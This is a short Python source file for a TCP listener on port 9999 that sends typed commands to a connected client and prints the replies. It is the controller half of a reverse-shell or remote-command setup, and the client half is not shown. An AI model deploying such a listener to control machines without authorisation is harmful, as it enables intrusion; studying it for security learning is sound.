from __future__ import print_function
import socket
import sys


# Creating a socket that the client can connect to


def socket_create():
    try:
        global host
        global port
        global s

        print("Creating Socket")
        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding Socket to Port: " + str(port))
        s.bind((host, port))
        print("Listening...")
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error: " + str(msg))
        print("Trying Again...")
        socket_bind()


def socket_accept():
    connection, address = s.accept()
    print("Connection established with IP: " + str(address[0]) + " | Port: " + str(address[1]))
    send_commands(connection)
    connection.close()


def send_commands(connection):
    while True:
        cmd = str(raw_input())
        if cmd == 'quit':
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            client_response = str(connection.recv(1024))
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()







